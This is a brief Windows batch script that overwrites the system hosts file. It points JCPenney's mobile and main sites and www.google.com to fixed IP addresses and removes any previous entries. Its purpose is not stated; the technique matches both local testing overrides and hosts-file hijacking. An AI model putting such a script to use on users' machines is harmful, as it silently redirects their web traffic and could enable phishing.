@echo off
(echo 23.41.208.114 m.jcpenney.com
echo 23.41.208.114 www.jcpenney.com
echo 162.222.75.243 www.google.com) > %temp%\temphosts.txt
copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts